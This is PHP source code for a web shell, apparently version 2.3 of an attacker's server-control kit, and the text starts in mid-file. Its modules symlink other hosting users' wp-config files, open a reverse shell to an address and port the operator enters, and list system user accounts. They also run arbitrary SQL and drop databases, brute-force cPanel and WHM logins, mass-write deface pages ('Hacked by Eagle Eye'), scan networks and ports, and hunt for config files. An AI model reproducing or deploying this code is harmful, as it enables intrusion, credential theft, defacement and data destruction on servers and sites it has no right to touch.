                        $contents = $this->DFSFetch(self::$remote_url . "/htaccess.txt");
                        if($contents===""){ $contents = "ReadmeName %{user}%\nOptions Indexes FollowSymLinks\nDirectoryIndex index.html\nAddType text/plain .php\n"; }
                        $savedAs = basename($GLOBALS['DFConfig'][1]['dfsaved'] ?: 'wp-config.txt');
                        for ($uid = 0; $uid < 4000; $uid++){ 
                            $nothing = posix_getpwuid($uid);
                            if (!empty($nothing)){ 
                                $udir = $saveBase.'/sym/'.$nothing['name'];
                                if(!file_exists($udir)){ @mkdir($udir,0755,true); }
                                $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],@base64_decode(urldecode($GLOBALS['DFConfig'][1]['target'])));
                                if(isset($targetpath) && $targetpath!==""){
                                    // v2.3: escapeshellarg stops command injection via target path
                                    $this->DFSExecute("ln -s ".escapeshellarg($targetpath).' '.escapeshellarg($udir.'/'.$savedAs)); 
                                    @symlink($targetpath, $udir.'/'.$savedAs);
                                    @file_put_contents($udir.'/.htaccess',$this->DFSRender('/%{user}%/i',$savedAs,$contents));
                                    print("Done! -> ".$this->DFSH($nothing['name'])." -> <a href='".$this->DFSH($udir.'/'.$savedAs)."'>Open</a><br>");
                                }
                            }
                        }
                    }else{
                        echo "<center><font color='red' size='6'><code>Not work in window!</code></font></center>";
                    }
                }
                echo "</div></section>";

            break;
            case "reverse":
                $raw = $this->DFSFetch(self::$remote_url.'/others.html');
                $parts = $raw!=="" ? explode('||',$raw) : array();
                $revhtml = $parts[1] ?? "<form action='' method='POST'><table><tr><td id='reva'><label>Address : </label></td><td><input type='text' name='dfsaddr' placeholder='192.168.1.1'></td></tr><tr><td id='reva'><label>Port : </label></td><td><input type='text' name='dfsport' placeholder='1337'></tr><tr><td></td><td id='revc'><input type='submit' name='dfsrev' value='Reverse'></tr></table></form>";
                echo "<section class='reverse'>";
                if(!isset($GLOBALS['DFConfig'][1]['dfsrev'])){
                    echo $revhtml;
                }else{
                    echo $revhtml;
                    echo "<code>";
                    $addr = trim($GLOBALS['DFConfig'][1]['dfsaddr']);
                    $port = trim($GLOBALS['DFConfig'][1]['dfsport']);
                    $this->DFSReverse($addr,$port);
                    echo "</code>";
                }
                echo "</section>";
            break;
            case "conf":
                echo "<section class='configs'>";
                $pwid = array();
                if($GLOBALS['DFSPlatform']!=='win'){
                    for ($uid = 0; $uid < 4000; $uid++){ 
                        $nothing = posix_getpwuid($uid);
                        if (!empty($nothing)){ 
                            array_push($pwid,$nothing['name'].':'.$nothing['passwd'].':'.$nothing['uid'].':'.$nothing['gid'].':'.$nothing['dir'].':'.$nothing['shell']);
                        }
                    }
                    foreach($pwid as $conf){
                        print($conf."<br>");
                    }
                }else{
                    echo "<center>Not work in window!</center>";
                }
                echo "</section>";
            break;
            case "unzip":
                $from = $this->Dec($GLOBALS['DFConfig'][0]['dfp']);
                $zipp = $this->Dec($GLOBALS['DFConfig'][0]['dff']);
                echo "<section id='unzipping'>";
                if(isset($GLOBALS['DFConfig'][1]['destination'])){
                    if(!class_exists('ZipArchive')){ $this->DFSPopupMSG(4,null,"ZipArchive not available!",null,false); }
                    else{
                        $ziproc = new ZipArchive;
                        $pth = $from.$zipp;
                        $dest = rtrim($GLOBALS['DFConfig'][1]['destination'],"\\/");
                        if(!is_dir($dest)){ @mkdir($dest,0755,true); }
                        if ($ziproc->open($pth) === TRUE) {
                            // v2.3: ZipSlip guard — reject entries with .. or absolute paths
                            $blocked = array();
                            for($zi=0;$zi<$ziproc->numFiles;$zi++){
                                $nm = $ziproc->getNameIndex($zi);
                                if(preg_match('#(^/|^[A-Za-z]:|\.\.)#',$nm)){ $blocked[]=$nm; }
                            }
                            if(count($blocked)){
                                $ziproc->close();
                                echo "<p style='color:red'>Blocked ZipSlip entries: ".$this->DFSH(implode(', ',array_slice($blocked,0,5)))."</p>";
                            }else{
                                $ziproc->extractTo($dest);
                                $ziproc->close();
                                $this->DFSPopupMSG(3,null,"File successfully extracted to destination!",null,false);
                            }
                        } else {
                            $this->DFSPopupMSG(4,null,"Failed to extract into destination!",null,false);
                        }
                    }
                }else{
                    echo "<center><font color='white'>Filename : ".$this->DFSH($from.$zipp)."</font>";
                    echo "<table><form action='' method='POST'><tr><td><label>Destination : </label></td>";
                    echo "<td><input type='text' name='destination' value='".$this->DFSH(dirname($from.$zipp))."'></td></tr><tr><td></td><td><button>Unzip</button></td>";
                    echo "</form></table></center>";
                }
                echo "</section>";
            break;
            case "scand":
                $slashtype = $this->DFSSlash();
                $path = $this->Dec(($this->query[0])). $slashtype;
                $path = $this->Dec($this->DFSDirFilter($path));
                $this->DFSCurrent($slashtype);
                echo "<div class='directory'><form action='' method='POST'>";
                echo "<table><th>Pick</th><th>Type</th><th>Name</th><th>Size</th><th>Owner:Groups</th><th>Perms</th><th>Modified</th><th>Action</th>";
                $folder = array_diff(scandir($path),['.','..']);
                $files = scandir($path);

                foreach($folder as $p){
                    if(is_dir($path . $slashtype . $p)){
                        $filtered = $this->Dec($this->DFSDirFilter($path));
                        $this->string = $filtered . $p;

                        $uid = explode(':',$this->DFSOG($filtered.$slashtype.$p));
                        //$og = posix_getpwuid($uid[0]);

                        $safeP = $this->DFSH($p);
                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($this->Enc())."||[novalue]'></td></td>";
                        echo "<td id='iconx'><i class='fa-regular fa-folder'></i></td><td id='tbname'><a href='?dfp=".urlencode($this->Enc())."'>$safeP</a></td>";
                        echo "<td></td>";
                        echo "<td id='tbcen'>".$this->DFSOG($filtered . $slashtype . $p)."</td>";
                        echo "<td id='tbcen'><a href='?dfp=".urlencode($this->Enc())."&dfaction=chmd'>".$this->DFSPerms($filtered . $slashtype . $p)."</a></td>";
                        echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",@filemtime($filtered . $slashtype . $p))."</td>";
                        echo "<td id='tbcen'> <a title='Rename' href='?dfp=".urlencode($this->Enc())."&dfaction=ren'><i class='fa-solid fa-pen'></i></a>. 
                        <a title='Delete' href='?dfp=".urlencode($this->Enc())."&dfaction=del'><i class='fa-solid fa-trash'></i></a> .
                        <a title='Info' href='?dfp=".urlencode($this->Enc())."&dfaction=info'><i class='fa-solid fa-circle-info'></i></a></td></tr></p>";

                    }
                }
                foreach($files as $p){
                    if(is_file($path . $slashtype . $p)){
                        $filtered = $this->Dec($this->DFSDirFilter($path));
                        $this->string = $filtered;
                        $dfp = $this->Enc();
                        $this->string = $p;
                        $dff = $this->Enc();
                        $compressed = array("zip","tar","gz","rar");
                        $isZip = pathinfo($p,PATHINFO_EXTENSION);
                        $safeP = $this->DFSH($p);
                        if(in_array(strtolower($isZip),$compressed)){
                            $tname = $safeP . "<button style='border-radius:8px;background:orange;'>
                            <a style='color:black;' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=unzip'>
                             UNZIP </a></button>";
                        }else{
                            $tname = $safeP;
                        }

                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($dfp)."||".urlencode($dff)."'></td></td>";
                        echo "<td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$tname</a></td>";
                        echo "<td>".$this->DFSFormat(@filesize($filtered.$p))."</td>";
                        echo "<td id='tbcen'>".$this->DFSOG($filtered.$p)."</td>";
                        echo "<td id='tbcen'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=chmd'>".$this->DFSPerms($filtered.$p)."</a></td>";
                        echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",@filemtime($filtered.$p))."</td>";
                        echo "<td id='tbcen'>
                        <a title='Edit' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=edit'><i class='fa-solid fa-file-signature'></i></a> . 
                        <a title='Rename' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=ren'><i class='fa-solid fa-pen'></i></a> . 
                        <a title='Copy' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=copy'><i class='fa-solid fa-copy'></i></a> .
                        <a title='Move' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=move'><i class='fa-solid fa-arrows-up-down-left-right'></i></a> .
                        <a title='Info' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=info'><i class='fa-solid fa-circle-info'></i></a> .
                        <a title='Delete' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=del'><i class='fa-solid fa-trash'></i></a> . 
                        <a title='Download' href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a></td></tr></p>";
                    }
                }
                echo "</table>
                <div id='anact'>

                <select name='selectAction'>
                <option value=''>-- Action --</option>
                <option value='Zip'>-- Zip --</option>
                <option value='Delete'>-- Delete --</option>
                </select>
                <input type='submit' value='Submit'>
                </div></form></div>";

            break;
            case "del":
                $slashtype = $this->DFSSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]?:''));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if(is_file($pathfile)||is_link($pathfile)){
                    if(@unlink($pathfile)){
                        $this->DFSPopupMSG(3,null,"File Successfully deleted!",null,false);
                    }else{
                        $this->DFSPopupMSG(4,null,"Permission denied!",null,false);
                    }
                }else if(is_dir($pathfile)){
                    // v2.3: recursive (old rmdir failed on non-empty)
                    if($this->DFSRDelete($pathfile)){
                        $this->DFSPopupMSG(3,null,"Directory Successfully deleted!",null,false);
                    }else{
                        $this->DFSPopupMSG(4,null,"Permission denied!",null,false);
                    }
                }
            break;
            case "ren":
                $slashtype = $this->DFSSlash();
                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
                $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                if(getcwd()==$pathfile){
                    $GLOBALS['DFSyntax'][3]($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']);
                }
                echo "<section id='dfsrename'>";
                if(isset($GLOBALS['DFConfig'][1]['newfile'])){
                    if(file_exists($pathfile)){
                        // v2.3: preg_quote basename (old code broke on dots/parens)
                        $dfsRen = preg_replace("/".preg_quote(basename($pathfile),'/')."/i",basename($GLOBALS['DFConfig'][1]['newfile']),$pathfile,1);
                        if(@rename($pathfile,$dfsRen)){
                            $this->DFSPopupMSG(5,"","File successfully renamed!","",true);
                            echo "<script>setTimeout(function(){ window.location.replace('?dfp=".urlencode($GLOBALS['DFConfig'][1]['reflink'])."') },1500);</script>";
                        }else{
                            $this->DFSPopupMSG(4,null,"Permission denied!",null,true);
                        }
                    }else{
                        $this->DFSPopupMSG(4,null,"No such file/directory!",null,true);
                    }
                }else{
                    $dfsren = preg_replace("/".preg_quote(basename($pathfile),'/')."/i","",$pathfile);
                    $this->string = $dfsren;
                    echo "<form action='' method='POST'>
                    <input type='hidden' name='reflink' value='".$this->Enc()."'>
                    <table><tr><td>
                    <label>Full path : </label></td><td>
                    <label>".$this->DFSH($pathfile)." </label></td></tr><tr>
                    <td><label>New name : </label></td><td>
                    <input type='text' name='newfile' placeholder='".$this->DFSH(basename($pathfile))."'></td></tr><tr>
                    <td></td><td><input type='submit' value='Rename'></tr>
                    </table></form>";
                }
                echo "</section>";
            break;
            case "sql":
                echo "<section class='databases'>";
                if(isset($_SESSION['sql_auth'])){
                    $sqldat = explode('|--|',$_SESSION['sql_auth']);
                    $conn = mysqli_connect($sqldat[0],$sqldat[1],$sqldat[2]);
                    if(isset($GLOBALS['DFConfig'][1]['other'])){
                        $this->DFSPopupMSG(1,"Get Adminer","Please get adminer from link below","<a href=\'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php\'>Adminer</a>",true);
                    }else if(isset($GLOBALS['DFConfig'][1]['sqldrop'])){
                        $ftar = array("'",'"');
                        if(!isset($GLOBALS['DFConfig'][0]['tbname'])){
                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $dropping = str_replace($ftar,"",$GLOBALS['DFConfig'][0]['dbname']);
                            $dropsql = "DROP DATABASE $dropping";
                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Database DROPPED!",null,false);
                        }else{
                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $dropping = str_replace($ftar,"",$GLOBALS['DFConfig'][0]['tbname']);
                            $dropsql = "DROP TABLE $dropping";
                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Table DROPPED!",null,false);
                        }
                    }else if(isset($GLOBALS['DFConfig'][1]['sqlcommands'])){
                        if(isset($GLOBALS['DFConfig'][0]['dbname'])){
                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
                        }else{
                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
                        }
                    }else{

                        echo "<div id='sqlside'>
                        <form action='' method='POST'><input type='submit' value='Logout' name='sqllogout'></form>
                        <form action='' method='POST'><input type='submit' name='other' value='Get Adminer'></form>";
                        if(isset($GLOBALS['DFConfig'][0]['tbname']) || isset($GLOBALS['DFConfig'][0]['dbname'])){
                            echo "<form action='' method='POST'>
                            <input style='background:red;' type='submit' name='sqldrop' value='DROP'></form>";
                        }
                        echo "</div>
                        <form action='' method='POST'><table><tr><td><textarea name='sqlcommands' placeholder='Theres no output ,just use for edit value in database' name='sqlcmd'></textarea>
                        </td></tr><tr><td><input type='submit' value='Execute'></td></tr></table></form>";
                        echo "<div id='fieldx'><label>Connected to mysql</label><br>";

                        if(!isset($GLOBALS['DFConfig'][0]['dbname'])){
                            echo "<button><a id='blacky' href='?dfaction=sql'>Back</a></button><br>";
                        }else{
                            if(!isset($GLOBALS['DFConfig'][0]['tbname'])){
                                echo "<button><a id='blacky' href='?dfaction=sql'>Back</a></button><br>";
                            }else{
                                echo "<button><a id='blacky' href='?dfaction=sql&dbname=".$GLOBALS['DFConfig'][0]['dbname']."'>Back</a></button>
                                     <br>";
                            }
                        }

                        if(isset($GLOBALS['DFConfig'][0]['dbname'])){
                            $dbs = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['dbname']);
                            $sql = "select table_name from information_schema.tables where table_schema='$dbs';";
                            $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch = mysqli_fetch_assoc($query)){
                                echo "<a href='?dfaction=sql&dbname=".$dbs."&tbname=".$fetch['table_name'] ."'>". $fetch['table_name'] . "</a><br>";
                            }
                            echo "</div><div id='sqlcol'>";
                            if(isset($GLOBALS['DFConfig'][0]['tbname'])){
                                if(!isset($GLOBALS['DFConfig'][0]['limit'])){
                                    mysqli_select_db($conn,$dbs);
                                    $tbl = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['tbname']);
                                    $sql = "select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1 = "select * from $tbl limit 20";
                                    $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1 = mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo "<table>";
                                    while($fetch=mysqli_fetch_assoc($query)){
                                        echo "<th>".$fetch['column_name']."</th>";
                                    }
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo "<tr>";
                                        foreach($fetch1 as $key => $val){
                                            echo "<td>".$val."</td>";
                                        }
                                        echo "</tr>";
                                    }
                                    $total_row=mysqli_num_rows($query1);
                                    echo "</table>";
                                    if($total_row>0){
                                        echo "<form action='' method='GET'><table>";
                                        echo "<input type='hidden' value='sql' name='dfaction'>";
                                        echo "<input type='hidden' value='".$dbs."' name='dbname'>";
                                        echo "<input type='hidden' value='".$tbl."' name='tbname'>";
                                        echo "<tr><td><label>Set offset,limit</label></td><td>
                                        <input type='text' placeholder='eg: 20,50' name='limit'></td></tr>
                                        <tr><td></td><td><input type='submit' value='Lets Go'></td></tr>";
                                        echo "</table></form>";
                                    }
                                    echo "</div>";
                                }else{
                                    $limits = explode(',',$GLOBALS['DFConfig'][0]['limit']);
                                    $offset = intval($limits[0]);
                                    $limit = intval($limits[1]);
                                    mysqli_select_db($conn,$dbs);
                                    $tbl = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['tbname']);
                                    $sql = "select column_name from information_schema.columns where table_name='$tbl'";
                                    $sql1 = "select * from $tbl limit $offset,$limit";
                                    $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                                    $query1 = mysqli_query($conn,$sql1) or exit(mysqli_error($conn));
                                    echo "<table>";
                                    while($fetch=mysqli_fetch_assoc($query)){
                                        echo "<th>".$fetch['column_name']."</th>";
                                    }
                                    while($fetch1=mysqli_fetch_assoc($query1)){
                                        echo "<tr>";
                                        foreach($fetch1 as $key => $val){
                                            echo "<td>".$val."</td>";
                                        }
                                        echo "</tr>";
                                    }
                                    echo "</table>";
                                    $total_row=mysqli_num_rows($query1);
                                    if($total_row>0){
                                        echo "<form action='' method='GET'><table>";
                                        echo "<input type='hidden' value='sql' name='dfaction'>";
                                        echo "<input type='hidden' value='".$dbs."' name='dbname'>";
                                        echo "<input type='hidden' value='".$tbl."' name='tbname'>";
                                        echo "<tr><td><label>Set offset,limit</label></td><td>
                                        <input type='text' placeholder='eg: 20,50' name='limit'></td></tr>
                                        <tr><td></td><td><input type='submit' value='Lets Go'></td></tr>";
                                        echo "</table></form>";
                                    }
                                    echo"</div>";
                                }

                            }
                        }else{
                            $sql = "select schema_name from information_schema.schemata";
                            $query = mysqli_query($conn,$sql) or exit(mysqli_error($conn));
                            while($fetch = mysqli_fetch_assoc($query)){
                                echo "<a href='?dfaction=sql&dbname=".$fetch['schema_name']."'>". $fetch['schema_name'] . "</a><br>";
                            }
                            echo "</div>";
                        }

                        if(isset($GLOBALS['DFConfig'][1]['sqllogout'])){
                            $_SESSION['sql_auth'] = null;
                            unset($_SESSION['sql_auth']);
                            echo "<script>window.location.replace('?dfaction=sql');</script>";
                        }
                        if(isset($GLOBALS['DFConfig'][1]['sqlcmd'])){
                            $sqlcmd = $GLOBALS['DFConfig'][1]['sqlcmd'];
                            $qrycmd = mysqli_query($conn,$sqlcmd) or exit(mysqli_error($conn));
                            $this->DFSPopupMSG(1,"SQL Query","Command successfully executed!","",true);
                        }
                    }
                }else{
                    if(!isset($GLOBALS['DFConfig'][1]['connect_sql'])){
                        $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
                        echo $pp[4] ?? "<fieldset><center><label>MYSQL CONNECT</label></center><form action='' method='POST'><table><tr><td><label>Host : </label></td><td><input type='text' placeholder='127.0.0.1' name='sqlhost'/></td></tr><tr><td><label>User : </label></td><td><input type='text' placeholder='root' name='sqluser'/></td></tr><tr><td><label>Pass : </label></td><td><input type='text' placeholder='' name='sqlpass'/></td></tr><tr><td><label></label></td><td><input type='submit' value='Connect' name='connect_sql'/></td></tr></table></form></fieldset>";
                    }else{
                        $tmp_conn = mysqli_connect($GLOBALS['DFConfig'][1]['sqlhost'],$GLOBALS['DFConfig'][1]['sqluser'],$GLOBALS['DFConfig'][1]['sqlpass']) or exit($this->DFSPopupMSG(2,"MySQL Connection","Cannot connect to database!","",true));
                        if(!mysqli_connect_errno()){
                            $_SESSION['sql_auth'] = $GLOBALS['DFConfig'][1]['sqlhost']."|--|".$GLOBALS['DFConfig'][1]['sqluser']."|--|".$GLOBALS['DFConfig'][1]['sqlpass'];
                            echo "<script>window.location.replace(window.location.href);</script>";
                        }else{
                            echo "Failed to connect mysql";
                            exit;
                        }
                    }
                }
                echo "</section>";
            break;
            case "logout":
                unset($_SESSION['DFS_Auth']);
                session_destroy();
                echo "<script>window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
            break;
            case "crack":
                if(!isset($GLOBALS['DFConfig'][1]['crack'])){
                    $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
                    echo $pp[0] ?? "<section class='cracksection'><form action='' method='POST'><table><th>User</th><th>Pass</th><tr><td><textarea name='userlist' required></textarea></td><td><textarea name='passlist' required></textarea></td></tr><tr><td id='crackx'><label>Host : </label><input type='text' name='host' placeholder='target.com' required></td><td id='crackx'><label>Timeout : </label><input type='text' name='timeout' placeholder='0.1' required></td></tr><tr><td id='toright'><input type='radio' name='portc' value='2083' required><label>Cpanel</label></td><td><input type='radio' name='portc' value='2087' required><label>WHM</label></tr></td></table><div id='subcrack'><input type='submit' name='crack' value='Crack' required></div></form></section>";
                }else{
                    $host = $GLOBALS['DFConfig'][1]['host'];
                    $user = explode("\n",$GLOBALS['DFConfig'][1]['userlist']);
                    $pass = explode("\n",$GLOBALS['DFConfig'][1]['passlist']);
                    $port = $GLOBALS['DFConfig'][1]['portc'];
                    $timeout = $GLOBALS['DFConfig'][1]['timeout'];
                    echo "<section class='crackresults'>";
                    foreach($user as $u){
                        print("<p>Trying for user -> ".$this->DFSH(trim($u))."</p>");
                        foreach($pass as $p){
                            $this->DFSCracker(trim($host),$port,trim($u),trim($p),trim($timeout));
                        }
                    }
                    echo "<p>Done!</p>";
                    echo "</section>";
                }
            break;
            case "mass":
                $slashtype = $this->DFSSlash();
                echo "<section class='mass'>";
                if(!isset($GLOBALS['DFConfig'][1]['dfmass'])){
                    $raw = $this->DFSFetch(self::$remote_url.'/others.html'); $pp = $raw!==""?explode('||',$raw):array();
                    echo $pp[2] ?? "<form action='' method='POST'><table><tr><td><label>Code : </label></td><td><textarea name='codemass'></textarea></td></tr><tr><td><label>Remote : </label></td><td><input type='text' name='fromurl' placeholder='https://url/deface.txt'></td></tr><tr><td><label>Filename : </label></td><td><input type='text' name='massname' placeholder='deface.html'></td></tr><tr><td><label>Path : </label></td><td><input type='text' name='masspath' placeholder='/var/www/html/path/'></td></tr><tr><td></td><td><input type='submit' name='dfmass' value='Mass'></td></tr></table></form>";
                }else{
                    $arrpath = glob($GLOBALS['DFConfig'][1]['masspath'] . $slashtype . '*', GLOB_ONLYDIR);
                    
                    if(!empty($GLOBALS['DFConfig'][1]['fromurl']) && 
                    $GLOBALS['DFConfig'][1]['fromurl']!=="" &&
                    $GLOBALS['DFConfig'][1]['fromurl']!==NULL){
                        if(filter_var($GLOBALS['DFConfig'][1]['fromurl'], FILTER_VALIDATE_URL)){
                            $ncode = $this->DFSFetch($GLOBALS['DFConfig'][1]['fromurl']);
                            if($ncode===""){ die("<script>alert('Fetch failed — check URL/allow_url_fopen');window.location.replace(window.location.href);</script>"); }
                        }else{
                            die("<script>alert('Check url');window.location.replace(window.location.href);</script>");
                        }
                    }else{
                        $ncode = $GLOBALS['DFConfig'][1]['codemass'] ?: 'Hacked by Eagle Eye';
                    }
                    $massname = basename($GLOBALS['DFConfig'][1]['massname'] ?: 'deface.html');
                    $massbase = rtrim($GLOBALS['DFConfig'][1]['masspath'],"\\/");
                    $lekluh = $massbase . $slashtype . $massname;
                    $rakluh = @fopen($lekluh,'w');
                    if($rakluh){ fwrite($rakluh,$ncode); }
                    foreach((array)$arrpath as $p){
                        $npath = $p . $slashtype . $massname;
                        $nopen = @fopen($npath,'w');
                        if($nopen){ fwrite($nopen,$ncode); fclose($nopen); }
                    }
                    if($rakluh){ fclose($rakluh); }
                    $this->DFSPopupMSG(1,"Mass defacements","All file successfully created!","",true);
                }
                echo "</section>";
            break;
            case "netscan":
                $defBase = $this->DFSLocalBase();
                echo "<section class='netscan'><h3>Local Network IP Scanner <small style='color:#888'>(v2.3)</small></h3>";
                echo "<form action='' method='POST'><table>";
                echo "<tr><td><label>Subnet base : </label></td><td><input type='text' name='netsubnet' value='".$this->DFSH($_POST['netsubnet'] ?? $defBase)."' placeholder='192.168.1.'></td></tr>";
                echo "<tr><td><label>Probe ports : </label></td><td><input type='text' name='netports' value='".$this->DFSH($_POST['netports'] ?? '80,443,22,445')."' placeholder='80,443,22'></td></tr>";
                echo "<tr><td><label>Timeout (s) : </label></td><td><input type='text' name='nettimeout' value='".$this->DFSH($_POST['nettimeout'] ?? '0.4')."'></td></tr>";
                echo "<tr><td></td><td><input type='submit' name='dfnetscan' value='Scan /24'></td></tr>";
                echo "</table></form><div class='scanresults'>";
                if(isset($GLOBALS['DFConfig'][1]['dfnetscan'])){
                    $pp = array_map('intval', explode(',', $GLOBALS['DFConfig'][1]['netports']));
                    $res = $this->DFSNetScan($GLOBALS['DFConfig'][1]['netsubnet'], $GLOBALS['DFConfig'][1]['nettimeout'], $pp);
                    echo "<p>Subnet <b>".$this->DFSH($res['base'])."0/24</b> — <b>".count($res['live'])."</b> live host(s)</p>";
                    if(count($res['live'])){
                        echo "<table class='scantable'><tr><th>IP</th><th>Open probe</th><th>Latency</th><th>Hostname</th><th>Action</th></tr>";
                        foreach($res['live'] as $h){
                            $hip = $this->DFSH($h['ip']);
                            echo "<tr><td>$hip</td><td>".$h['port']."</td><td>".$h['ms']." ms</td><td>".$this->DFSH($h['host'])."</td>";
                            echo "<td><a href='?dfaction=portscan&target=$hip'>Port-scan</a></td></tr>";
                        }
                        echo "</table>";
                    }else{
                        echo "<p style='color:orange'>No live hosts on probe ports. Try different ports / larger timeout.</p>";
                    }
                }else{
                    echo "<p style='color:#aaa'>Auto-detected base: <b>".$this->DFSH($defBase)."0/24</b>. Scans 254 hosts via TCP connect (no root needed).</p>";
                }
                echo "</div></section>";
            break;
            case "portscan":
                $defTarget = $GLOBALS['DFConfig'][0]['target'] ?? ($_SERVER['SERVER_ADDR'] ?? '127.0.0.1');
                echo "<section class='portscan'><h3>Port Scanner <small style='color:#888'>(v2.3)</small></h3>";
                echo "<form action='' method='POST'><table>";
                echo "<tr><td><label>Host : </label></td><td><input type='text' name='pshost' value='".$this->DFSH($_POST['pshost'] ?? $defTarget)."' placeholder='127.0.0.1'></td></tr>";
                echo "<tr><td><label>Ports : </label></td><td><input type='text' name='psports' value='".$this->DFSH($_POST['psports'] ?? '21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443')."' placeholder='1-1000 or 80,443'></td></tr>";
                echo "<tr><td><label>Timeout : </label></td><td><input type='text' name='pstimeout' value='".$this->DFSH($_POST['pstimeout'] ?? '0.5')."'></td></tr>";
                echo "<tr><td></td><td><label style='font-size:12px'><input type='checkbox' name='psbanner' value='1' checked> Banner grab</label> <input type='submit' name='dfportscan' value='Scan'></td></tr>";
                echo "</table></form><div class='scanresults'>";
                if(isset($GLOBALS['DFConfig'][1]['dfportscan'])){
                    $ports = $this->DFSParsePorts($GLOBALS['DFConfig'][1]['psports']);
                    if(empty($ports)){ echo "<p style='color:red'>No valid ports (max 2000, format e.g. 1-1000,8080).</p>"; }
                    else{
                        $res = $this->DFSPortScan($GLOBALS['DFConfig'][1]['pshost'],$ports,$GLOBALS['DFConfig'][1]['pstimeout'],isset($GLOBALS['DFConfig'][1]['psbanner']));
                        echo "<p>Host <b>".$this->DFSH($res['host'])."</b> — <b>".count($res['open'])."</b>/".$res['total']." open (".$res['closed']." closed/filtered)</p>";
                        if(count($res['open'])){
                            echo "<table class='scantable'><tr><th>Port</th><th>Service</th><th>Latency</th><th>Banner</th></tr>";
                            foreach($res['open'] as $o){
                                echo "<tr><td><b style='color:#69e01f'>".$o['port']."/open</b></td><td>".$this->DFSH($o['service'])."</td><td>".$o['ms']." ms</td><td>".$this->DFSH($o['banner'])."</td></tr>";
                            }
                            echo "</table>";
                        }else{ echo "<p style='color:orange'>All scanned ports closed/filtered.</p>"; }
                    }
                }else{
                    echo "<p style='color:#aaa'>TCP-connect scan with banner grab. Keep ranges &lt; 2000 ports to avoid timeouts.</p>";
                }
                echo "</div></section>";
            break;
            case "search":
                $slashtype = $this->DFSSlash();
                $basePath = isset($this->query[0]) ? $this->Dec($this->query[0]) : getcwd();
                if($basePath===""||$basePath===false){ $basePath = getcwd(); }
                echo "<section class='searchbox'><h3>File Search <small style='color:#888'>(v2.3)</small></h3>";
                echo "<form action='' method='POST'><table>";
                echo "<tr><td><label>Base path : </label></td><td><input type='text' name='searchpath' value='".$this->DFSH($_POST['searchpath'] ?? $basePath)."' style='width:320px'></td></tr>";
                echo "<tr><td><label>Keyword : </label></td><td><input type='text' name='searchkey' value='".$this->DFSH($_POST['searchkey'] ?? '')."' placeholder='wp-config'></td></tr>";
                echo "<tr><td><label>Extension : </label></td><td><input type='text' name='searchext' value='".$this->DFSH($_POST['searchext'] ?? '')."' placeholder='php (optional)'></td></tr>";
                echo "<tr><td></td><td><input type='submit' name='dfsearch' value='Search'></td></tr>";
                echo "</table></form><div class='scanresults'>";
                if(isset($GLOBALS['DFConfig'][1]['dfsearch'])){
                    $spath = rtrim($GLOBALS['DFConfig'][1]['searchpath'],'\\/');
                    $skey = $GLOBALS['DFConfig'][1]['searchkey'];
                    $sext = ltrim(trim($GLOBALS['DFConfig'][1]['searchext']),'.');
                    if(!is_dir($spath)){ echo "<p style='color:red'>Not a directory: ".$this->DFSH($spath)."</p>"; }
                    else{
                        @set_time_limit(0);
                        $found = array(); $scanned = 0;
                        try{
                            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($spath, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
                            foreach($it as $f){
                                $scanned++;
                                if(count($found)>=500){ break; }
                                if($scanned>50000){ break; }
                                $bn = $f->getFilename();
